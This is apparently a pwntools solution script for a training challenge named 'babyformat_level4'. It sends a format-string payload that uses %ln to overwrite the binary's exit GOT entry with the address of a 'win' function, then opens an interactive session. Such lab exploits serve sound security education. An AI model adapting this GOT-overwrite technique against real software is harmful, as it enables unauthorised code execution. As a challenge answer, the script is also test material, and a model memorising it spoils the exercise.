from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level4')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

OBJ = ELF("/challenge/babyformat_level4")

exit_got = OBJ.got['exit']
win_address = OBJ.sym['win']

print(hex(exit_got))
print(hex(win_address))
# print(len(str(win_address)))

payload = b'%0' + str(win_address-98).encode() + b'd%69$ln' + b'a'*6+ p64(exit_got)

io.sendline(payload)
io.interactive()
io.close()

io.interactive()

